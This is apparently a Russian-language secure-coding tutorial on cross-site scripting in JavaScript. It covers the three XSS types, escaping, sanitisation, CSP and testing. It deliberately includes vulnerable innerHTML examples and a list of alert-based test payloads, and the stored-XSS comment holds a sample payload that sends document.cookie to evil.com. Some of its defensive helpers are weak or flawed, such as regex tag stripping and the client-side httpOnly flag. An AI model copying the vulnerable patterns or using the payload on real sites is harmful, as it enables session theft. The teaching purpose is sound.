# XSS (Межсайтовый скриптинг)

XSS (Cross-Site Scripting) - это тип уязвимости, при котором злоумышленник может внедрить и выполнить вредоносный скрипт в контексте браузера жертвы. Это позволяет атакующему получить доступ к чувствительной информации, выполнить действия от имени пользователя или перенаправить на вредоносный сайт.

## Типы XSS

### 1. Reflected XSS (Отраженный XSS)

Отраженный XSS происходит, когда вредоносный скрипт "отражается" от веб-сервера, например, в результате ошибки, поиска или другого запроса, который включает непроверенные данные.

```javascript
// Плохой пример: прямой вывод данных из URL без проверки
function displaySearchQuery() {
    const urlParams = new URLSearchParams(window.location.search);
    const query = urlParams.get('q');
    
    // Опасно! Пользовательский ввод вставляется без очистки
    document.getElementById('search-results').innerHTML = 
        `Результаты поиска для: ${query}`;
}

// Злоумышленник может использовать URL: 
// http://example.com/search?q=<script>alert('XSS')</script>
```

### 2. Stored XSS (Хранимый XSS)

Хранимый XSS возникает, когда вредоносный скрипт сохраняется на сервере (в базе данных, комментариях, профилях пользователей и т.д.) и затем отображается другим пользователям.

```javascript
// Плохой пример: сохранение и отображение комментариев без очистки
function saveComment(commentText) {
    // Комментарий сохраняется в базе данных как есть
    db.collection('comments').insertOne({
        text: commentText,
        user: getCurrentUser(),
        timestamp: new Date()
    });
}

function displayComments() {
    const comments = db.collection('comments').find({});
    
    comments.forEach(comment => {
        // Опасно! Комментарий вставляется без очистки
        document.getElementById('comments-container').innerHTML += 
            `<div class="comment">${comment.text}</div>`;
    });
}

// Злоумышленник может оставить комментарий:
// <script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
```

### 3. DOM-based XSS (DOM-ориентированный XSS)

DOM-ориентированный XSS происходит, когда вредоносный скрипт манипулирует DOM в браузере жертвы, а не на сервере.

```javascript
// Плохой пример: манипуляции с DOM на основе пользовательского ввода
function updatePageContent() {
    const hash = window.location.hash.substring(1); // Получаем хэш из URL
    
    // Опасно! Вставляем содержимое хэша напрямую в DOM
    document.getElementById('content').innerHTML = hash;
}

// Злоумышленник может использовать URL:
// http://example.com/#<img src="x" onerror="alert('XSS')">
```

## Защита от XSS

### 1. Экранирование вывода (Output Encoding)

```javascript
// Функция для безопасного экранирования HTML
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// Использование безопасного экранирования
function displaySafeSearchQuery() {
    const urlParams = new URLSearchParams(window.location.search);
    const query = urlParams.get('q');
    
    // Безопасно! Пользовательский ввод экранируется перед вставкой
    document.getElementById('search-results').textContent = 
        `Результаты поиска для: ${escapeHtml(query)}`;
}

// Альтернативный способ с использованием DOM API
function displaySafeSearchQueryDOM() {
    const urlParams = new URLSearchParams(window.location.search);
    const query = urlParams.get('q');
    
    const resultsElement = document.getElementById('search-results');
    resultsElement.innerHTML = ''; // Очистка
    
    const textNode = document.createTextNode(`Результаты поиска для: ${query}`);
    resultsElement.appendChild(textNode);
}
```

### 2. Санитизация HTML

```javascript
// Использование библиотеки DOMPurify для санитизации HTML
// <script src="https://cdn.jsdelivr.net/npm/dompurify@2.3.3/dist/purify.min.js"></script>

function displaySafeHtmlContent(content) {
    // Санитизация HTML перед вставкой
    const sanitized = DOMPurify.sanitize(content);
    document.getElementById('content').innerHTML = sanitized;
}

// Настройка санитизации для конкретных тегов
function displaySafeHtmlWithWhitelist(content) {
    const config = {
        ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li'],
        ALLOWED_ATTR: ['class', 'style']
    };
    
    const sanitized = DOMPurify.sanitize(content, config);
    document.getElementById('content').innerHTML = sanitized;
}

// Кастомная функция санитизации
class HtmlSanitizer {
    static sanitize(input, options = {}) {
        const allowedTags = options.allowedTags || ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li'];
        const allowedAttributes = options.allowedAttributes || ['class', 'id'];
        
        // Создаем временный элемент для парсинга
        const tempDiv = document.createElement('div');
        tempDiv.innerHTML = input;
        
        this.cleanNode(tempDiv, allowedTags, allowedAttributes);
        
        return tempDiv.innerHTML;
    }
    
    static cleanNode(node, allowedTags, allowedAttributes) {
        if (node.nodeType === Node.ELEMENT_NODE) {
            // Проверяем, разрешен ли тег
            if (!allowedTags.includes(node.tagName.toLowerCase())) {
                // Если тег не разрешен, удаляем его, но сохраняем содержимое
                const parent = node.parentNode;
                const children = Array.from(node.childNodes);
                
                for (const child of children) {
                    parent.insertBefore(child, node);
                }
                
                parent.removeChild(node);
                return;
            }
            
            // Удаляем небезопасные атрибуты
            const attributes = Array.from(node.attributes);
            for (const attr of attributes) {
                if (!allowedAttributes.includes(attr.name) || 
                    attr.name.startsWith('on')) { // Удаляем event handlers
                    node.removeAttribute(attr.name);
                }
            }
            
            // Рекурсивно обрабатываем дочерние элементы
            const children = Array.from(node.childNodes);
            for (const child of children) {
                this.cleanNode(child, allowedTags, allowedAttributes);
            }
        }
    }
}
```

### 3. Правильное использование innerHTML

```javascript
// Плохо: прямое использование innerHTML с пользовательскими данными
element.innerHTML = userInput;

// Хорошо: использование textContent для текстовых данных
element.textContent = userInput;

// Хорошо: безопасное использование innerHTML с проверенными данными
function safeInsertHtml(htmlString) {
    // Создаем временный элемент для парсинга
    const temp = document.createElement('div');
    temp.innerHTML = htmlString;
    
    // Проверяем и очищаем содержимое
    const cleanContent = sanitizeContent(temp);
    
    // Вставляем очищенное содержимое
    element.innerHTML = cleanContent.innerHTML;
}

// Использование шаблонов для безопасного создания DOM
function createSafeElement(tag, content, attributes = {}) {
    const element = document.createElement(tag);
    
    // Безопасное добавление текстового содержимого
    element.textContent = content;
    
    // Безопасное добавление атрибутов
    Object.entries(attributes).forEach(([key, value]) => {
        if (isValidAttribute(key, value)) {
            element.setAttribute(key, value);
        }
    });
    
    return element;
}

function isValidAttribute(name, value) {
    // Запрещаем event handler атрибуты
    if (name.startsWith('on')) {
        return false;
    }
    
    // Проверяем протоколы в href/src атрибутах
    if (['href', 'src', 'action'].includes(name)) {
        try {
            const url = new URL(value, window.location.origin);
            return ['http:', 'https:', 'mailto:', 'tel:'].includes(url.protocol);
        } catch (e) {
            return false; // Невалидный URL
        }
    }
    
    return true;
}
```

## Современные подходы защиты

### 1. Content Security Policy (CSP)

```html
<!-- Установка CSP через HTTP заголовок -->
<!-- Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' -->

<!-- CSP через meta тег -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; object-src 'none';">

<!-- Пример строгой CSP -->
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; 
               script-src 'self' 'nonce-abc123' 'strict-dynamic' https:; 
               style-src 'self' 'unsafe-inline'; 
               img-src 'self' data: https:; 
               font-src 'self'; 
               connect-src 'self' https://api.example.com;">
```

### 2. Использование шаблонов

```javascript
// Безопасное использование шаблонов
class TemplateEngine {
    constructor() {
        this.templates = new Map();
    }
    
    register(name, template) {
        this.templates.set(name, template);
    }
    
    render(name, data) {
        const template = this.templates.get(name);
        if (!template) {
            throw new Error(`Шаблон ${name} не найден`);
        }
        
        // Заменяем переменные с экранированием
        let result = template;
        for (const [key, value] of Object.entries(data)) {
            // Экранируем HTML специальные символы
            const escapedValue = this.escapeHtml(value);
            result = result.replace(new RegExp(`{{${key}}}`, 'g'), escapedValue);
        }
        
        return result;
    }
    
    escapeHtml(text) {
        if (typeof text !== 'string') {
            text = String(text);
        }
        
        const escapeMap = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '/': '&#x2F;'
        };
        
        return text.replace(/[&<>"'\/]/g, (match) => escapeMap[match]);
    }
}

// Использование
const templateEngine = new TemplateEngine();
templateEngine.register('user-card', `
    <div class="user-card">
        <h3>{{name}}</h3>
        <p>{{email}}</p>
        <span class="role">{{role}}</span>
    </div>
`);

const userCardHtml = templateEngine.render('user-card', {
    name: '<script>alert("XSS")</script>John Doe',
    email: 'john@example.com',
    role: 'admin'
});

// Результат безопасен: скрипт не выполнится
document.getElementById('container').innerHTML = userCardHtml;
```

### 3. Использование фреймворков с встроенной защитой

```javascript
// Пример с React (автоматически экранирует JSX)
// const element = <div>{userInput}</div>; // userInput будет экранирован

// Пример с Vue.js (автоматически экранирует интерполяции)
// <div>{{ userInput }}</div> // userInput будет экранирован

// Пример с Angular (автоматически экранирует интерполяции)
// <div>{{ userInput }}</div> // userInput будет экранирован

// Вручную с ванильным JS
function renderUserContent(userData) {
    const container = document.getElementById('user-content');
    
    // Создаем элементы через DOM API для автоматической защиты
    const nameElement = document.createElement('h3');
    nameElement.textContent = userData.name; // Автоматическое экранирование
    
    const emailElement = document.createElement('p');
    emailElement.textContent = userData.email; // Автоматическое экранирование
    
    const roleElement = document.createElement('span');
    roleElement.className = 'role';
    roleElement.textContent = userData.role; // Автоматическое экранирование
    
    container.appendChild(nameElement);
    container.appendChild(emailElement);
    container.appendChild(roleElement);
}
```

## Практические примеры защиты

### 1. Безопасная обработка форм

```javascript
// Класс для безопасной обработки форм
class SecureFormHandler {
    constructor(formSelector) {
        this.form = document.querySelector(formSelector);
        this.setupEventListeners();
    }
    
    setupEventListeners() {
        this.form.addEventListener('submit', this.handleSubmit.bind(this));
    }
    
    handleSubmit(event) {
        event.preventDefault();
        
        const formData = new FormData(this.form);
        const sanitizedData = {};
        
        for (const [key, value] of formData.entries()) {
            sanitizedData[key] = this.sanitizeInput(value);
        }
        
        // Отправка очищенных данных
        this.submitData(sanitizedData);
    }
    
    sanitizeInput(input) {
        // Простая очистка строкового ввода
        if (typeof input === 'string') {
            // Удаление HTML тегов
            input = input.replace(/<[^>]*>/g, '');
            
            // Ограничение длины
            if (input.length > 1000) {
                input = input.substring(0, 1000);
            }
            
            // Удаление потенциально опасных последовательностей
            input = input.replace(/(javascript:|vbscript:|data:)/gi, '');
        }
        
        return input;
    }
    
    async submitData(data) {
        try {
            const response = await fetch('/api/submit', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(data)
            });
            
            if (!response.ok) {
                throw new Error('Ошибка отправки данных');
            }
            
            console.log('Данные успешно отправлены');
        } catch (error) {
            console.error('Ошибка при отправке данных:', error);
        }
    }
}

// Использование
const secureForm = new SecureFormHandler('#user-form');
```

### 2. Безопасная загрузка и отображение контента

```javascript
// Класс для безопасной загрузки и отображения контента
class SecureContentLoader {
    constructor(containerSelector) {
        this.container = document.querySelector(containerSelector);
    }
    
    async loadContent(url, options = {}) {
        try {
            const response = await fetch(url);
            
            if (!response.ok) {
                throw new Error(`HTTP error! status: ${response.status}`);
            }
            
            const content = await response.text();
            
            // Санитизация содержимого перед отображением
            const sanitizedContent = this.sanitizeContent(content, options);
            
            this.container.innerHTML = sanitizedContent;
        } catch (error) {
            console.error('Ошибка загрузки контента:', error);
            this.showError('Ошибка загрузки контента');
        }
    }
    
    sanitizeContent(content, options) {
        // Создаем временный элемент для парсинга
        const tempDiv = document.createElement('div');
        tempDiv.innerHTML = content;
        
        // Очищаем содержимое
        this.cleanNode(tempDiv, options);
        
        return tempDiv.innerHTML;
    }
    
    cleanNode(node, options = {}) {
        const allowedTags = options.allowedTags || ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'];
        const allowedAttributes = options.allowedAttributes || ['class', 'id', 'style'];
        const allowedProtocols = options.allowedProtocols || ['http:', 'https:', 'mailto:', 'tel:'];
        
        if (node.nodeType === Node.ELEMENT_NODE) {
            // Проверяем разрешенные теги
            const tagName = node.tagName.toLowerCase();
            if (!allowedTags.includes(tagName)) {
                // Если тег не разрешен, заменяем его содержимым
                const parent = node.parentNode;
                const children = Array.from(node.childNodes);
                
                for (const child of children) {
                    parent.insertBefore(child, node);
                }
                
                parent.removeChild(node);
                return;
            }
            
            // Проверяем атрибуты
            const attributes = Array.from(node.attributes);
            for (const attr of attributes) {
                // Удаляем event handler атрибуты
                if (attr.name.startsWith('on')) {
                    node.removeAttribute(attr.name);
                    continue;
                }
                
                // Проверяем разрешенные атрибуты
                if (!allowedAttributes.includes(attr.name)) {
                    node.removeAttribute(attr.name);
                    continue;
                }
                
                // Проверяем протоколы для href/src атрибутов
                if (['href', 'src', 'action', 'formaction'].includes(attr.name)) {
                    try {
                        const url = new URL(attr.value, window.location.origin);
                        if (!allowedProtocols.includes(url.protocol)) {
                            node.removeAttribute(attr.name);
                        }
                    } catch (e) {
                        // Если URL невалидный, удаляем атрибут
                        node.removeAttribute(attr.name);
                    }
                }
            }
            
            // Рекурсивно обрабатываем дочерние элементы
            const children = Array.from(node.childNodes);
            for (const child of children) {
                this.cleanNode(child, options);
            }
        }
    }
    
    showError(message) {
        this.container.innerHTML = `<div class="error">${this.escapeHtml(message)}</div>`;
    }
    
    escapeHtml(text) {
        const div = document.createElement('div');
        div.textContent = text;
        return div.innerHTML;
    }
}

// Использование
const contentLoader = new SecureContentLoader('#content-container');
contentLoader.loadContent('/api/content', {
    allowedTags: ['p', 'br', 'strong', 'em', 'ul', 'ol', 'li'],
    allowedAttributes: ['class']
});
```

## Лучшие практики

### 1. Валидация и санитизация на всех уровнях

```javascript
// Комплексная система валидации и санитизации
class SecurityValidator {
    static validateAndSanitize(input, rules) {
        let value = input;
        
        // Применяем правила валидации
        if (rules.required && !value) {
            throw new Error('Обязательное поле не заполнено');
        }
        
        if (rules.minLength && value.length < rules.minLength) {
            throw new Error(`Минимальная длина: ${rules.minLength}`);
        }
        
        if (rules.maxLength && value.length > rules.maxLength) {
            value = value.substring(0, rules.maxLength);
        }
        
        if (rules.pattern && !new RegExp(rules.pattern).test(value)) {
            throw new Error('Неверный формат данных');
        }
        
        // Санитизация
        if (rules.sanitize) {
            value = this.sanitize(value, rules.sanitize);
        }
        
        return value;
    }
    
    static sanitize(value, options) {
        if (typeof value !== 'string') {
            return value;
        }
        
        let result = value;
        
        if (options.stripHtml) {
            result = result.replace(/<[^>]*>/g, '');
        }
        
        if (options.escapeHtml) {
            result = this.escapeHtml(result);
        }
        
        if (options.trim) {
            result = result.trim();
        }
        
        if (options.lowercase) {
            result = result.toLowerCase();
        }
        
        if (options.uppercase) {
            result = result.toUpperCase();
        }
        
        return result;
    }
    
    static escapeHtml(text) {
        const escapeMap = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '/': '&#x2F;'
        };
        
        return text.replace(/[&<>"'\/]/g, (match) => escapeMap[match]);
    }
}

// Использование
try {
    const userInput = '<script>alert("XSS")</script>Hello World!';
    const sanitizedInput = SecurityValidator.validateAndSanitize(userInput, {
        required: true,
        maxLength: 100,
        sanitize: {
            stripHtml: true,
            trim: true
        }
    });
    
    console.log('Очищенный ввод:', sanitizedInput); // "Hello World!"
} catch (error) {
    console.error('Ошибка валидации:', error.message);
}
```

### 2. Защита сессий и куки

```javascript
// Управление безопасными куки
class SecureCookieManager {
    static set(name, value, options = {}) {
        const cookieOptions = {
            path: '/',
            secure: true, // Только по HTTPS
            sameSite: 'Strict', // Защита от CSRF
            httpOnly: false, // Устанавливается на клиенте, поэтому false
            ...options
        };
        
        let cookieString = `${name}=${encodeURIComponent(value)}`;
        
        if (cookieOptions.expires) {
            cookieString += `; expires=${cookieOptions.expires.toUTCString()}`;
        }
        
        if (cookieOptions.maxAge) {
            cookieString += `; max-age=${cookieOptions.maxAge}`;
        }
        
        if (cookieOptions.domain) {
            cookieString += `; domain=${cookieOptions.domain}`;
        }
        
        if (cookieOptions.path) {
            cookieString += `; path=${cookieOptions.path}`;
        }
        
        if (cookieOptions.secure) {
            cookieString += '; secure';
        }
        
        if (cookieOptions.httpOnly) {
            cookieString += '; httpOnly';
        }
        
        if (cookieOptions.sameSite) {
            cookieString += `; samesite=${cookieOptions.sameSite}`;
        }
        
        document.cookie = cookieString;
    }
    
    static get(name) {
        const nameEQ = name + "=";
        const ca = document.cookie.split(';');
        
        for (let i = 0; i < ca.length; i++) {
            let c = ca[i];
            while (c.charAt(0) === ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) === 0) {
                return decodeURIComponent(c.substring(nameEQ.length, c.length));
            }
        }
        
        return null;
    }
    
    static remove(name, path = '/', domain = null) {
        let expires = "Thu, 01 Jan 1970 00:00:01 GMT";
        let cookieString = `${name}=; expires=${expires}; path=${path}`;
        
        if (domain) {
            cookieString += `; domain=${domain}`;
        }
        
        document.cookie = cookieString;
    }
}

// Использование
SecureCookieManager.set('sessionToken', 'abc123', {
    maxAge: 3600, // 1 час
    sameSite: 'Strict'
});
```

## Тестирование на XSS

### 1. Автоматизированные тесты

```javascript
// Функция для тестирования XSS уязвимостей
function testXSSVulnerability(inputElement, outputElement) {
    const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src="x" onerror="alert(\'XSS\')">',
        'javascript:alert("XSS")',
        '<svg onload=alert("XSS")>',
        '"><script>alert("XSS")</script>',
        '<iframe src="javascript:alert(\'XSS\')"></iframe>'
    ];
    
    let vulnerabilitiesFound = [];
    
    xssPayloads.forEach((payload, index) => {
        // Вводим полезную нагрузку
        inputElement.value = payload;
        
        // Предполагаем, что есть функция обработки ввода
        processInput(); // Эта функция должна обрабатывать ввод и выводить результат
        
        // Проверяем, выполнится ли скрипт
        const originalAlert = window.alert;
        let alertCalled = false;
        
        window.alert = function() {
            alertCalled = true;
            vulnerabilitiesFound.push({
                payload: payload,
                index: index
            });
        };
        
        // Вызываем потенциальный XSS
        outputElement.innerHTML = outputElement.innerHTML; // Имитация выполнения
        
        // Восстанавливаем alert
        window.alert = originalAlert;
    });
    
    return vulnerabilitiesFound;
}
```

### 2. Ручное тестирование

```javascript
// Инструменты для ручного тестирования XSS
class XSSTester {
    static testUrlParameters() {
        const urlParams = new URLSearchParams(window.location.search);
        const results = [];
        
        for (const [param, value] of urlParams) {
            // Проверяем, отображается ли параметр на странице
            const pageContent = document.documentElement.innerHTML;
            if (pageContent.includes(value)) {
                results.push({
                    parameter: param,
                    value: value,
                    potentiallyVulnerable: true
                });
            }
        }
        
        return results;
    }
    
    static testFormInputs() {
        const forms = document.querySelectorAll('form');
        const results = [];
        
        forms.forEach((form, formIndex) => {
            const inputs = form.querySelectorAll('input, textarea, select');
            
            inputs.forEach((input, inputIndex) => {
                // Проверяем, есть ли возможность XSS через этот элемент
                results.push({
                    form: formIndex,
                    input: inputIndex,
                    name: input.name,
                    type: input.type,
                    testable: ['text', 'textarea', 'search'].includes(input.type)
                });
            });
        });
        
        return results;
    }
}

// Использование (только для тестирования!)
// const urlTests = XSSTester.testUrlParameters();
// const formTests = XSSTester.testFormInputs();
// console.log('Результаты тестирования XSS:', urlTests, formTests);
```

XSS является одной из наиболее распространенных и опасных уязвимостей веб-приложений. Защита от XSS требует комплексного подхода, включающего валидацию, санитизацию и правильное кодирование данных на всех этапах обработки пользовательского ввода.

#javascript #xss #security #frontend #web-development #security-best-practices